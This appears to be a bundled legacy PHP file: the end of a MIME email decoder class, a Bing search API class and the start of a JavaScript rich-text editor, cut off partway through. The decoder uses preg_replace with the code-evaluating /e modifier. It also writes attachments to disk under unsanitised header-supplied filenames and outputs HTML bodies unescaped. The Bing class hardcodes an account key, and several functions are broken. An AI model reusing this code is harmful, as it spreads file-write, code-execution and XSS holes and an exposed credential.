	                    $param_name  = substr($parameters[$i], 0, $pos = strpos($parameters[$i], '='));
	                    $param_value = substr($parameters[$i], $pos + 1);
	                    if ($param_value[0] == '"') {
	                        $param_value = substr($param_value, 1, -1);
	                    }
	                    $return['other'][$param_name] = $param_value;
	                    $return['other'][strtolower($param_name)] = $param_value;
	                }
	            }
	        } else {
	            $return['value'] = trim($input);
	        }
	
	        return $return;
	    }
	
	    /**
	     * This function splits the input based
	     * on the given boundary
	     *
	     * @param string Input to parse
	     * @return array Contains array of resulting mime parts
	     * @access private
	     */
	    function _boundarySplit($input, $boundary)
	    {
			$boundary=trim($boundary);
			if(substr($boundary,-1)=='"')
		     	$boundary=substr_replace($boundary,"" ,-1 );
			if(substr($boundary,0,1)=='"')
		     	$boundary=substr_replace($boundary,"" ,0,1);
			$boundary=trim($boundary);
		    $tmp = explode('--'.$boundary,$input);//boundary
	        for ($i=1; $i<count($tmp)-1; $i++) {
	            $parts[] = $tmp[$i];
	        }
	
	        return $parts;
	    }
	
	    /**
	     * Given a header, this function will decode it
	     * according to RFC2047. Probably not *exactly*
	     * conformant, but it does pass all the given
	     * examples (in RFC2047).
	     *
	     * @param string Input header value to decode
	     * @return string Decoded header value
	     * @access private
	     */
	    function _decodeHeader($input)
	    {
	        // Remove white space between encoded-words
	        $input = preg_replace('/(=\?[^?]+\?(q|b)\?[^?]*\?=)(\s)+=\?/i', '\1=?', $input);
	
	        // For each encoded-word...
	        while (preg_match('/(=\?([^?]+)\?(q|b)\?([^?]*)\?=)/i', $input, $matches)) {
	
	            $encoded  = $matches[1];
	            $charset  = $matches[2];
	            $encoding = $matches[3];
	            $text     = $matches[4];
	
	            switch (strtolower($encoding)) {
	                case 'b':
	                    $text = base64_decode($text);
	                    break;
	
	                case 'q':
	                    $text = str_replace('_', ' ', $text);
	                    preg_match_all('/=([a-f0-9]{2})/i', $text, $matches);
	                    foreach($matches[1] as $value)
	                        $text = str_replace('='.$value, chr(hexdec($value)), $text);
	                    break;
	            }
	
	            $input = str_replace($encoded, $text, $input);
	        }
	
	        return $input;
	    }
	
	    /**
	     * Given a body string and an encoding type,
	     * this function will decode and return it.
	     *
	     * @param  string Input body to decode
	     * @param  string Encoding type to use.
	     * @return string Decoded body
	     * @access private
	     */
	    function _decodeBody($input, $encoding = '7bit')
	    {
	        switch ($encoding) {
	            case '7bit':
	                return $input;
	                break;
	
	            case 'quoted-printable':
	                return $this->_quotedPrintableDecode($input);
	                break;
	
	            case 'base64':
	                return base64_decode($input);
	                break;
	
	            default:
	                return $input;
	        }
	    }
	
	    /**
	     * Given a quoted-printable string, this
	     * function will decode and return it.
	     *
	     * @param  string Input body to decode
	     * @return string Decoded body
	     * @access private
	     */
	    function _quotedPrintableDecode($input)
	    {
	        // Remove soft line breaks
	        $input = preg_replace("/=\r?\n/", '', $input);
	
	        // Replace encoded characters
			$input = preg_replace('/=([a-f0-9]{2})/ie', "chr(hexdec('\\1'))", $input);
	
	        return $input;
	    }
	
	    /**
	     * Checks the input for uuencoded files and returns
	     * an array of them. Can be called statically, eg:
	     *
	     * $files =& MIMEDECODE::uudecode($some_text);
	     *
	     * It will check for the begin 666 ... end syntax
	     * however and won't just blindly decode whatever you
	     * pass it.
	     *
	     * @param  string Input body to look for attahcments in
	     * @return array  Decoded bodies, filenames and permissions
	     * @access public
	     * @author Unknown
	     */
	    function &uudecode($input)
	    {
	        // Find all uuencoded sections
	        preg_match_all("/begin ([0-7]{3}) (.+)\r?\n(.+)\r?\nend/Us", $input, $matches);
	
	        for ($j = 0; $j < count($matches[3]); $j++) {
	
	            $str      = $matches[3][$j];
	            $filename = $matches[2][$j];
	            $fileperm = $matches[1][$j];
	
	            $file = '';
	            $str = preg_split("/\r?\n/", trim($str));
	            $strlen = count($str);
	
	            for ($i = 0; $i < $strlen; $i++) {
	                $pos = 1;
	                $d = 0;
	                $len=(int)(((ord(substr($str[$i],0,1)) -32) - ' ') & 077);
	
	                while (($d + 3 <= $len) AND ($pos + 4 <= strlen($str[$i]))) {
	                    $c0 = (ord(substr($str[$i],$pos,1)) ^ 0x20);
	                    $c1 = (ord(substr($str[$i],$pos+1,1)) ^ 0x20);
	                    $c2 = (ord(substr($str[$i],$pos+2,1)) ^ 0x20);
	                    $c3 = (ord(substr($str[$i],$pos+3,1)) ^ 0x20);
	                    $file .= chr(((($c0 - ' ') & 077) << 2) | ((($c1 - ' ') & 077) >> 4));
	
	                    $file .= chr(((($c1 - ' ') & 077) << 4) | ((($c2 - ' ') & 077) >> 2));
	
	                    $file .= chr(((($c2 - ' ') & 077) << 6) |  (($c3 - ' ') & 077));
	
	                    $pos += 4;
	                    $d += 3;
	                }
	
	                if (($d + 2 <= $len) && ($pos + 3 <= strlen($str[$i]))) {
	                    $c0 = (ord(substr($str[$i],$pos,1)) ^ 0x20);
	                    $c1 = (ord(substr($str[$i],$pos+1,1)) ^ 0x20);
	                    $c2 = (ord(substr($str[$i],$pos+2,1)) ^ 0x20);
	                    $file .= chr(((($c0 - ' ') & 077) << 2) | ((($c1 - ' ') & 077) >> 4));
	
	                    $file .= chr(((($c1 - ' ') & 077) << 4) | ((($c2 - ' ') & 077) >> 2));
	
	                    $pos += 3;
	                    $d += 2;
	                }
	
	                if (($d + 1 <= $len) && ($pos + 2 <= strlen($str[$i]))) {
	                    $c0 = (ord(substr($str[$i],$pos,1)) ^ 0x20);
	                    $c1 = (ord(substr($str[$i],$pos+1,1)) ^ 0x20);
	                    $file .= chr(((($c0 - ' ') & 077) << 2) | ((($c1 - ' ') & 077) >> 4));
	
	                }
	            }
	            $files[] = array('filename' => $filename, 'fileperm' => $fileperm, 'filedata' => $file);
	        }
	
	        return $files;
	    }
	
	    /**
	     * getSendArray() returns the arguments required for Mail::send()
	     * used to build the arguments for a mail::send() call 
	     *
	     * Usage:
	     * $mailtext = Full email (for example generated by a template)
	     * $decoder = new MIMEDECODE($mailtext);
	     * $parts =  $decoder->getSendArray();
	     * if (!PEAR::isError($parts) {
	     *     list($recipents,$headers,$body) = $parts;
	     *     $mail = Mail::factory('smtp');
	     *     $mail->send($recipents,$headers,$body);
	     * } else {
	     *     echo $parts->message;
	     * }
	     * @return mixed   array of recipeint, headers,body or Pear_Error
	     * @access public
	     * @author Alan Knowles <alan@akbkhome.com>
	     */
	    function getSendArray()
	    {
	        // prevent warning if this is not set
	        $this->_decode_headers = FALSE;
	        $headerlist =$this->_parseHeaders($this->_header);
	        $to = "";
	        if (!$headerlist) {
	            return $this->raiseError("Message did not contain headers");
	        }
	        foreach($headerlist as $item) {
	            $header[$item['name']] = $item['value'];
	            switch (strtolower($item['name'])) {
	                case "to":
	                case "cc":
	                case "bcc":
	                    $to = ",".$item['value'];
	                default:
	                   break;
	            }
	        }
	        if ($to == "") {
	            return $this->raiseError("Message did not contain any recipents");
	        }
	        $to = substr($to,1);
	        return array($to,$header,$this->_body);
	    } 
	
	
	
	
	
	
	
	
	
	    /**
	     * Returns a xml copy of the output of
	     * MIMEDECODE::decode. Pass the output in as the
	     * argument. This function can be called statically. Eg:
	     *
	     * $output = $obj->decode();
	     * $xml    = MIMEDECODE::getXML($output);
	     *
	     * The DTD used for this should have been in the package. Or
	     * alternatively you can get it from cvs, or here:
	     * http://www.phpguru.org/xmail/xmail.dtd.
	     *
	     * @param  object Input to convert to xml. This should be the
	     *                output of the MIMEDECODE::decode function
	     * @return string XML version of input
	     * @access public
	     */
	    function getXML($input)
	    {
	        $crlf    =  "\r\n";
	        $output  = '<?php xml version=\'1.0\'?>' . $crlf .
	                   '<!DOCTYPE email SYSTEM "http://www.phpguru.org/xmail/xmail.dtd">' . $crlf .
	                   '<email>' . $crlf .
	                   MIMEDECODE::_getXML($input) .
	                   '</email>';
	
	        return $output;
	    }
	
	    /**
	     * Function that does the actual conversion to xml. Does a single
	     * mimepart at a time.
	     *
	     * @param  object  Input to convert to xml. This is a mimepart object.
	     *                 It may or may not contain subparts.
	     * @param  integer Number of tabs to indent
	     * @return string  XML version of input
	     * @access private
	     */
	    function _getXML($input, $indent = 1)
	    {
	        $htab    =  "\t";
	        $crlf    =  "\r\n";
	        $output  =  '';
	        $headers = @(array)$input->headers;
	
	        foreach ($headers as $hdr_name => $hdr_value) {
	
	            // Multiple headers with this name
	            if (is_array($headers[$hdr_name])) {
	                for ($i = 0; $i < count($hdr_value); $i++) {
	                    $output .= MIMEDECODE::_getXML_helper($hdr_name, $hdr_value[$i], $indent);
	                }
	
	            // Only one header of this sort
	            } else {
	                $output .= MIMEDECODE::_getXML_helper($hdr_name, $hdr_value, $indent);
	            }
	        }
	
	        if (!empty($input->parts)) {
	            for ($i = 0; $i < count($input->parts); $i++) {
	                $output .= $crlf . str_repeat($htab, $indent) . '<mimepart>' . $crlf .
	                           MIMEDECODE::_getXML($input->parts[$i], $indent+1) .
	                           str_repeat($htab, $indent) . '</mimepart>' . $crlf;
	            }
	        } elseif (isset($input->body)) {
	            $output .= $crlf . str_repeat($htab, $indent) . '<body><![CDATA[' .
	                       $input->body . ']]></body>' . $crlf;
	        }
	
	        return $output;
	    }
	
	    /**
	     * Helper function to _getXML(). Returns xml of a header.
	     *
	     * @param  string  Name of header
	     * @param  string  Value of header
	     * @param  integer Number of tabs to indent
	     * @return string  XML version of input
	     * @access private
	     */
	    function _getXML_helper($hdr_name, $hdr_value, $indent)
	    {
	        $htab   = "\t";
	        $crlf   = "\r\n";
	        $return = '';
	
	        $new_hdr_value = ($hdr_name != 'received') ? MIMEDECODE::_parseHeaderValue($hdr_value) : array('value' => $hdr_value);
	        $new_hdr_name  = str_replace(' ', '-', ucwords(str_replace('-', ' ', $hdr_name)));
	
	        // Sort out any parameters
	        if (!empty($new_hdr_value['other'])) {
	            foreach ($new_hdr_value['other'] as $paramname => $paramvalue) {
	                $params[] = str_repeat($htab, $indent) . $htab . '<parameter>' . $crlf .
	                            str_repeat($htab, $indent) . $htab . $htab . '<paramname>' . htmlspecialchars($paramname) . '</paramname>' . $crlf .
	                            str_repeat($htab, $indent) . $htab . $htab . '<paramvalue>' . htmlspecialchars($paramvalue) . '</paramvalue>' . $crlf .
	                            str_repeat($htab, $indent) . $htab . '</parameter>' . $crlf;
	            }
	
	            $params = implode('', $params);
	        } else {
	            $params = '';
	        }
	
	        $return = str_repeat($htab, $indent) . '<header>' . $crlf .
	                  str_repeat($htab, $indent) . $htab . '<headername>' . htmlspecialchars($new_hdr_name) . '</headername>' . $crlf .
	                  str_repeat($htab, $indent) . $htab . '<headervalue>' . htmlspecialchars($new_hdr_value['value']) . '</headervalue>' . $crlf .
	                  $params .
	                  str_repeat($htab, $indent) . '</header>' . $crlf;
	
	        return $return;
	    }

		////this function is used to get the parsed message  or you shoud say fineal message
		/////arguments [in]$object = object returned by get_message function defined above
		/////arguments [in]$msg = a pointer to messgae
		///// this function returns message string
		function get_parsed_message()
		{
			$object=$this->decode();
			/*$msg.="<b>To : </b>".$object->headers[to]."<br>";
			$msg.="<b>From : </b>".$object->headers[from]."<br>";
			$msg.="<b>Subject : </b>".$object->headers[subject]."<br>";
			$msg.="<b>Date : </b>".$object->headers[date]."<br><br>";*/
			//$main_content_type=trim($object->ctype_primary)."/".trim($object->ctype_secondary);
			//trim(strtok($object->headers['content-type'],";"));
			//$msg.=$this->walk(&$object,"",$main_content_type);
			return $msg;
		}

		function walk($object,$msg="",$main_content_type="")
		{
			if(!isset($object->parts))
			{
				//$ctype=trim(strtok($object->headers['content-type'],";"));
				$ctype=trim($object->ctype_primary)."/".trim($object->ctype_secondary);
				switch($ctype)
				{
					case "text/html":
						$msg.=$object->body;
						break;
					case "text/plain":
						$enc=$object->headers['content-transfer-encoding'];
						if($enc!="quoted-printable")
							$msg.=nl2br($object->body);
						break;
					case "image/jpeg":
					case "image/gif":
						$name=trim($object->headers['name']);		
						$cid=trim($object->headers['content-id']);		
						$cid=str_replace("<","",$cid);
						$cid=str_replace(">","",$cid);
						if(empty($name))
							 trim(strtok($object->headers['content-type'],"="));
						$name=trim(strtok("=\""));
						$temp="pop3_temp/";
						@mkdir($temp,777);
						$tmpfile=$temp.$name;
						//$tmpfile=realpath($tmpfile);
						$fp=fopen($tmpfile,"w");
						fwrite($fp,$object->body);
						fclose($fp);
						if($main_content_type=="multipart/mixed")
						{
							$msg.="<hr>";
							$msg.="<a href='$tmpfile' target='_blank'>$name</a>";
							$msg.="<hr>";
							$msg.="<img src='$tmpfile'>";			
						}
						$msg=str_replace("cid:$cid",$tmpfile,$msg);
						//@unlink($tmpfile);
						break;
					default:
						$name=trim($object->headers['name']);		
						if(empty($name))
							 trim(strtok($object->headers['content-type'],"="));
						$name=trim(strtok("=\""));
						$temp="pop3_temp/";
						@mkdir($temp,777);
						$tmpfile=$temp.$name;
						//$tmpfile=realpath($tmpfile);
						$fp=fopen($tmpfile,"w");
						fwrite($fp,$object->body);
						fclose($fp);
						$msg.="<hr>";
						$msg.="<a href='$tmpfile' target='_blank'>$name</a>";
						break;
				}
			}
			else
				foreach($object->parts as $obj){
if(substr(PHP_VERSION, 0, 3)=='5.4'){
					$this->walk($obj,$msg,$main_content_type);
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
					$this->walk($obj,$msg,$main_content_type);
}	
			}			

			return $msg;
		}
	
	} // End of class
?>

<?php 

// ----------------------------------------------------------------
//  Code.google.com - X3193-Google多用户多接口系统非标准独立类 v1.1
//  供能：实现多种接口调用，包括地图、相册、网址、日历等。
//  实现：X3193API
//  供应：google.com
//  收藏：☆☆☆☆☆
//  时间：2011-7-27 11:45AM
//  行数：45行
// ----------------------------------------------------------------
//  更新日志：
// ----------------------------------------------------------------

class bing_class{

var $accountkey = 'm6JvX/s5J8RF97Ip7um8pPRR0Kesh+G7HYSH/QiN3X0=';

function bingsearch($Service,$query,$pagesize,$page){
          $url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/v1/'.$Service.'?Query='.encodeuri("'").encodeuri(iconv(getcharset(),'utf-8',$query)).encodeuri("'").'&$top='.encodeuri($pagesize).'&$skip='.encodeuri($pagesize*($page-1)).'&$format=JSON';
          $postdata = '';
          $header[] = "Content-Type: text/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = json_decode(curl_exec($ch), true);
          //print_r($jsonarray.$url.getcharset());   
          curl_close($ch);
          
					$jsonstr = array();
					$jsonstr['totalitem'] = '1000';
					$jsonstr['pagesize'] = $pagesize;


        if ((count($jsonarray['d']['results']) == floor($pagesize-1)) || (count($jsonarray['d']['results']) > floor($pagesize-1))){
                $strpagesize = $pagesize; 
				}
        else{ 
                $strpagesize = count($jsonarray['d']['results']);

        }
        if (fmod($jsonstr['totalitem'], $pagesize) == 0){
                	$jsonstr['totalpage']=$jsonstr['totalitem']/$pagesize;
 				}       
   			else{
                	$jsonstr['totalpage']=ceil($jsonstr['totalitem']/$pagesize);
   			}
        $endid = $strpagesize-1;
				$jsonstr['endid'] = $endid;
				$jsonstr['page'] = $page;        
				for($i=0;$i<=$endid;$i++){
					$jsonstr[$i]['nodeuri']  = $jsonarray['d']['results'][$i]['__metadata']['uri'];	
					$jsonstr[$i]['nodetype']  = $jsonarray['d']['results'][$i]['__metadata']['type'];	
					$jsonstr[$i]['nodetitle']  = $jsonarray['d']['results'][$i]['Title'];	
					$jsonstr[$i]['nodedescript']  = $jsonarray['d']['results'][$i]['Description'];	
					$jsonstr[$i]['nodelink']  = $jsonarray['d']['results'][$i]['Url'];		
					$jsonstr[$i]['nodedisplaylink']  = $jsonarray['d']['results'][$i]['DisplayUrl'];				
					$jsonstr[$i]['nodeid']  = $jsonarray['d']['results'][$i]['ID'];						
				}
        //print_r($jsonarray.$url.$this->accountkey);                
        return $jsonstr;
}

}

// ----------------------------------------------------------------
//  Code.google.com - X3193-Google多用户多接口系统非标准独立类 v1.1
//  供能：实现多种接口调用，包括地图、相册、网址、日历等。
//  实现：X3193API
//  供应：google.com
//  收藏：☆☆☆☆☆
//  时间：2011-7-27 11:45AM
//  行数：45行
// ----------------------------------------------------------------
//  更新日志：
// ----------------------------------------------------------------

class HtmlEditor_class{

function HtmlEditor($deepcolor,$color){
?>
<script language="JavaScript" type="text/javascript">
// Web HTML Edit Code By nece001 
// Email: nece001@163.com
/* ---------------------------- Utils Area ---------------------------- */

// Get Absolute X
function __GetX(e){
var l=e.offsetLeft;
while(e=e.offsetParent){l+=e.offsetLeft;}
return l;
}

// Get Absolute Y
function __GetY(e){
var t=e.offsetTop;
while(e=e.offsetParent){t+=e.offsetTop;}
return t;
}

// Attach Event
function __AddEventHandler(Target, EventType, Handler){
  if(Target.attachEvent){
    Target.attachEvent("on" + EventType, Handler);
  }
  else if(Target.addEventListener){
    Target.addEventListener(EventType, Handler, false);
  }
  else{
    Target["on" + EventType] = Handler;
  }
}

// On Click/Left Button Down
function __MousLeftButton(e){
  __CloseMenu();
}

// On Context Menu/Right Button Down
function __MousRightButton(e){
  __CloseMenu();
  __ShowContextMenu(e);
  if(document.all){return false;}else{e.preventDefault();}
}

// Mouse Left Button Up
function __MouseUp(e){
  __CloseMenu();
  if(document.all){__CurrentGEditor = e.srcElement.document.parentWindow;}
  else{__CurrentGEditor = e.target.ownerDocument.defaultView;}
}

// On Key Up
function __KeyUp(e){
  __CloseMenu();
}

// On Key Down
function __KeyDown(e){
  __CheckInput(e);
  __CloseMenu();
}

// ToolButton Mouse Over
function  __TBmor(obj,s){
  obj.style.border = "1px outset"; 
  obj.style.backgroundColor = "#ffffff"; 
  //obj.innerHTML = '<B/>'+__TBData['1']["html"];
  if(document.all){
    obj.style.width = "15px";
    obj.style.height = "15px";
  }else{
    obj.style.width = "14px";
    obj.style.height = "14px";
  }
}

// Tool Button Mouse Out
function __TBmot(obj,s){
  obj.style.border = "0px outset";
  obj.style.backgroundColor = ""; 

  obj.style.width = "15px";
  obj.style.height = "15px";

}

// Hidden Or Show Select Element
function __HiddenSelect()
{
  var selects = document.getElementsByTagName("select");
  if(selects)
  {
    for (var i in selects)
    {
      if(selects[i].tagName && selects[i].tagName.toLowerCase() == "select"){
        selects[i].style.visibility = __FullScreenMode==1 ? "hidden" : "visible";
      }
    }
  }
}

// Simple HTML <BR>=><br />,<p></P>=><br />,=><span></span>
function __SimpleHTML(html)
{
  html = html.replace(/<(img [^>]+)>/gi, '<$1 \/>');
  html = html.replace(/<(input [^>]+)>/gi, '<$1 \/>');
  html = html.replace(/<\/?(BR|HR)[^>]*>/gi,'<$1 \/>');
  html = html.replace(/<P[^>]*>/gi,"");
  html = html.replace(/<\/P[^>]*>/gi,"<br />");
  var re = new RegExp("(<DIV)([^>]*>.*?)(<\/DIV>)","gi");
  html = html.replace(re,"<span$2</span>" );
  return html;
}

// GetPageSize From sina.com
function __GetPageSize() {
    var xScroll, yScroll;

    if (window.innerHeight && window.scrollMaxY) {
        xScroll = document.body.scrollWidth;
        yScroll = window.innerHeight + window.scrollMaxY;
    }
    else if (document.body.scrollHeight > document.body.offsetHeight){ // all but Explorer Mac
        xScroll = document.body.scrollWidth;
        yScroll = document.body.scrollHeight;
    }
    else { // Explorer Mac...would also work in Explorer 6 Strict, Mozilla and Safari
        xScroll = document.body.offsetWidth;
        yScroll = document.body.offsetHeight;
    }

    var windowWidth, windowHeight;
    if (self.innerHeight) {    // all except Explorer
        windowWidth = self.innerWidth;
        windowHeight = self.innerHeight;
    }
    else if (document.documentElement && document.documentElement.clientHeight) { // Explorer 6 Strict Mode
        windowWidth = document.documentElement.clientWidth;
        windowHeight = document.documentElement.clientHeight;
    }
    else if (document.body) { // other Explorers
        windowWidth = document.body.clientWidth;
        windowHeight = document.body.clientHeight;
    }

    // for small pages with total height less then height of the viewport
    if(yScroll < windowHeight){
        pageHeight = windowHeight;
    }
    else {
        pageHeight = yScroll;
    }

    // for small pages with total width less then width of the viewport
    if(xScroll < windowWidth){
        pageWidth = windowWidth;
    }
    else {
        pageWidth = xScroll;
    }

    arrayPageSize = new Array(pageWidth,pageHeight,windowWidth,windowHeight)
    return arrayPageSize;
}

// HTML Tags To Lower Case From SAX_Editor
function cleanNodes(s) {
	var htmlPattern = new RegExp('<[ ]*([\\w]+).*?>', 'gi');
	s = s.replace(htmlPattern, function(ref) {
		var cleanStartTag = "";
		var ref = ref.replace('^<[ ]*', '<');
		var ndx = ref.search(/\s/);
		var tagname = ref.substring(0 ,ndx);

		var attributes = ref.substring(ndx, ref.length);

		if (ndx == -1) return ref.toLowerCase();
		cleanStartTag += tagname.toLowerCase();

		var pairs = attributes.match(/[\w]+\s*=\s*("[^"]*"|[^">\s]*)/gi);
		if (pairs) {
			for (var t = 0; t < pairs.length; t++) {
				var pair = pairs[t];
				var ndx = pair.search(/=/);
				var attrname = pair.substring(0, ndx).toLowerCase();
				if (attrname.match(/on\w+/i)) {
					continue;
				}
				var attrval = pair.substring(ndx, pair.length);
				var wellFormed = new RegExp('=[ ]*"[^"]*"', "g");
				if (!wellFormed.test(attrval)) {
					var attrvalPattern = new RegExp('=(.*?)', 'g');
					attrval = attrval.replace(attrvalPattern, '=\"$1');
					attrval += '"';
				}
				var attr = attrname + attrval;
				cleanStartTag += " " + attr;
			}
		}
		cleanStartTag += ">";
		return cleanStartTag;
	});

	s = s.replace(/<\/\s*[\w]*\s*>/g, function (ref) {return ref.toLowerCase();});
	return s;
}

// Kill Word From eWebEditor Not Use 2007-7-14
function __KillWord( html ) {
  // Remove all SPAN tags
  html = html.replace(/<\/?SPAN[^>]*>/gi, "" );
  // Remove Class attributes
  html = html.replace(/<(\w[^>]*) class=([^ |>]*)([^>]*)/gi, "<$1$3") ;
  // Remove Style attributes
  html = html.replace(/<(\w[^>]*) style="([^"]*)"([^>]*)/gi, "<$1$3") ;
  // Remove Lang attributes
  html = html.replace(/<(\w[^>]*) lang=([^ |>]*)([^>]*)/gi, "<$1$3") ;
  // Remove XML elements and declarations
  html = html.replace(/<\\?\?xml[^>]*>/gi, "") ;
  // Remove Tags with XML namespace declarations: <o:p></o:p>
  html = html.replace(/<\/?\w+:[^>]*>/gi, "") ;
  // Replace the &nbsp;
  html = html.replace(/&nbsp;/, " " );
  // Transform <P> to <DIV>
  var re = new RegExp("(<P)([^>]*>.*?)(<\/P>)","gi") ;    // Different because of a IE 5.0 error
  return html = html.replace( re, "<div$2</div>" ) ;
}

function __WinOpen(url,w,h){ // Open New Window
  if(__EditorDialog==null || __EditorDialog.closed){
    __EditorDialog = window.open(url,"","width="+w+",height="+h+",top,left,toolbar=no,menubar=no,scrollbars=no, resizable=no,location=no, status=no");
  }else{
    __EditorDialog.location.href=url;
    __EditorDialog.focus();
  }
}

/* ---------------------------- Data Area ---------------------------- */
var currentRTE;
var __TBData = {
 'icoWgt' : {'bgp':"-69px 0",'fun':"__Format('Bold')",'tip':"Bold",'class':"toolButton",'html':'<font style=\"text-decoration:none;font-size:13px;valign:middle\"/><b/>粗'},
 'icoIta' : {'bgp':"-88px 0",'fun':"__Format('Italic')",'tip':"Italic",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/><i/>斜'},
 'icoUln' : {'bgp':"-108px 0",'fun':"__Format('Underline')",'tip':"Underline",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"><u/>划'},
 'icoNft' : {'bgp':"-235px 0",'fun':"__Format('RemoveFormat')",'tip':"Remove Format",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>格'},
 'icoFnt' : {'bgp':"-26px 0",'fun':"__ShowMenu(this,'__FontNameMenu__')",'tip':"Font Name",'class':"toolButton",'html':'<font style="font-family:\'幼圆\';color:#000000;text-decoration:none;font-size:13px"/><b/>字'},
 'icoFsz' : {'bgp':"-49px 0",'fun':"__ShowMenu(this,'__FontSizeMenu__')",'tip':"Font Size",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/><b/>字'},
 'icoCol' : {'bgp':"-2px 0",'fun':"__ShowMenu(this,'__FontColorMenu__')",'tip':"Font Color",'class':"toolButton",'html':'<font style="color:red;text-decoration:none;font-size:13px"/><b/>字'},
 'icoBGCol' : {'bgp':"-2px 0",'fun':"__ShowMenu(this,'__FontBGColorMenu__')",'tip':"Font Background Color",'class':"toolButton",'html':'<font style="color:#000000;background-color:<?php echo $color;?>;text-decoration:none;font-size:13px"/><b/>字'},
 'line_1' : {'bgp':"-392px 0",'fun':"",'tip':"",'class':"toolLine"},
 'icoAgl' : {'bgp':"-173px 0",'fun':"__Format('justifyleft')",'tip':"Align Left",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>左'},
 'icoAgc' : {'bgp':"-194px 0",'fun':"__Format('justifycenter')",'tip':"Align Center",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>中'},
 'icoAgr' : {'bgp':"-213px 0",'fun':"__Format('justifyright')",'tip':"Align Right",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>右'},
 'icoLul' : {'bgp':"-128px 0",'fun':"__Format('insertunorderedlist')",'tip':"Unorder List",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>项'},
 'icoLol' : {'bgp':"-150px 0",'fun':"__Format('insertorderedlist')",'tip':"Order List",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>编'},
 'icoLnk' : {'bgp':"-258px 0",'fun':"__CreateLink()",'tip':"Create Link",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>链'},
 'icoUlk' : {'bgp':"-283px 0",'fun':"__Format('Unlink');",'tip':"Clean Link",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>清'},
 'icoBrd' : {'bgp':"-327px 0",'fun':"__ElementsBorder()",'tip':"Helper Border",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>帮'},
 'icoImg' : {'bgp':"-306px 0",'fun':"__OpenImageDialog()",'tip':"Insert Image",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>图'},
 'line_2' : {'bgp':"-392px 0",'fun':"",'tip':"",'class':"toolLine"},
 'icoHtm' : {'bgp':"-346px 0",'fun':"__CodeArea()",'tip':"Html Code",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>源'},
 'icoFul' : {'bgp':"-369px 0",'fun':"__FullScreen()",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>屏'},
 'icoSall' : {'bgp':"-369px 0",'fun':"__Format('SelectAll')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>全'}, 
 'icoStr' : {'bgp':"-369px 0",'fun':"__Format('StrikeThrough')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>标'},
// 'icoDo' : {'bgp':"-369px 0",'fun':"__Format('Redo')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>做'},
 'icoDel' : {'bgp':"-369px 0",'fun':"__Format('Delete')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>删'}, 
// 'icoUndo' : {'bgp':"-369px 0",'fun':"__Format('Undo')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>撤'},
 'icoCut' : {'bgp':"-369px 0",'fun':"__Format('Cut')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>剪'},
 'icoCopy' : {'bgp':"-369px 0",'fun':"__Format('Copy')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>拷'},
 'icoPaste' : {'bgp':"-369px 0",'fun':"__Format('paste')",'tip':"Full Screen",'class':"toolButton",'html':'<font style="color:#000000;text-decoration:none;font-size:13px"/>粘'}
};

var __TBFont = {
 'heiti' : {'name':"&#40657;&#20307;",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'songti' : {'name':"&#23435;&#20307;",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'lishu' : {'name':"&#38582;&#20070;",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'kaiti' : {'name':"&#26999;&#20307;",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'youyuan' : {'name':"&#24188;&#22278;",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'Arial' : {'name':"Arial",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'Arial Black' : {'name':"Arial Black",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'Georgia' : {'name':"Georgia",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'Times New Roman' : {'name':"Times New Roman",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'Verdana' : {'name':"Verdana",'fun':"__Format(\"FontName\",this.innerHTML)"},
 'impact' : {'name':"impact",'fun':"__Format(\"FontName\",this.innerHTML)"}
};

var __TBColor = {
 'wine' : {'name':"暗红色",'color':"#800000"},
 'purple' : {'name':"&#32043;&#33394;",'color':"#800080"},
